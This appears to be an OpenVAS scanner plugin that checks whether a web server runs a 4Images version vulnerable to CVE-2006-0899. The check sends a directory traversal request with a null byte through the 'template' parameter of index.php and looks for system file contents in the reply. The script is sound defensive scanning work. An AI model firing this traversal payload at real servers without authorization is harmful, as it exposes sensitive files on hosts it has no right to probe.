###############################################################################
# OpenVAS Vulnerability Test
# $Id: 4images_171_directory_traversal.nasl 7577 2017-10-26 10:41:56Z cfischer $
#
# 4Images <= 1.7.1 Directory Traversal Vulnerability
#
# Authors:
# Ferdy Riphagen <f[dot]riphagen[at]nsec[dot]nl>
#
# Copyright:
# Copyright (C) 2006 Ferdy Riphagen
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2,
# as published by the Free Software Foundation
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

# Original advisory / discovered by :
# http://retrogod.altervista.org/4images_171_incl_xpl.html

CPE = "cpe:/a:4homepages:4images";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.21020");
  script_version("$Revision: 7577 $");
  script_tag(name:"last_modification", value:"$Date: 2017-10-26 12:41:56 +0200 (Thu, 26 Oct 2017) $");
  script_tag(name:"creation_date", value:"2006-03-26 17:55:15 +0200 (Sun, 26 Mar 2006)");
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_cve_id("CVE-2006-0899");
  script_bugtraq_id(16855);
  script_name("4Images <= 1.7.1 Directory Traversal Vulnerability");
  script_category(ACT_ATTACK);
  script_family("Web application abuses");
  script_copyright("This script is Copyright (C) 2006 Ferdy Riphagen");
  script_dependencies("gb_4images_detect.nasl", "os_detection.nasl");
  script_require_ports("Services/www", 80);
  script_mandatory_keys("4images/installed");

  script_xref(name:"URL", value:"http://www.4homepages.de/forum/index.php?topic=11855.0");
  script_xref(name:"URL", value:"http://secunia.com/advisories/19026/");

  tag_summary = "The remote web server contains a PHP application that is prone to
  directory traversal attacks.

  Description :

  4Images is installed on the remote system. It is an image gallery
  management system.

  The installed application does not validate user-input passed in the
  'template' variable of the 'index.php' file.";

  tag_impact = "This allows an attacker to execute directory traversal attacks
  and display the content of sensitive files on the system and possibly to execute
  arbitrary PHP code if he can write to local files through some other means.";

  tag_solution = "Sanitize the 'index.php' file.";

  script_tag(name:"solution", value:tag_solution);
  script_tag(name:"summary", value:tag_summary);

  script_tag(name:"qod_type", value:"remote_vul");

  exit(0);
}

include("misc_func.inc");
include("http_func.inc");
include("http_keepalive.inc");
include("host_details.inc");

if( ! port = get_app_port( cpe:CPE ) ) exit( 0 );
if( ! dir = get_app_location( cpe:CPE, port:port ) ) exit( 0 );

if( dir == "/" ) dir = "";

files = traversal_files();

foreach file( keys( files ) ) {

  url = dir + "/index.php?template=../../../../../../../../" + files[file] + "%00";

  if( http_vuln_check( port:port, url:url, pattern:file ) ) {
    report = report_vuln_url( port:port, url:url );
    security_message( port:port, data:report );
    exit( 0 );
  }
}

exit( 99 );
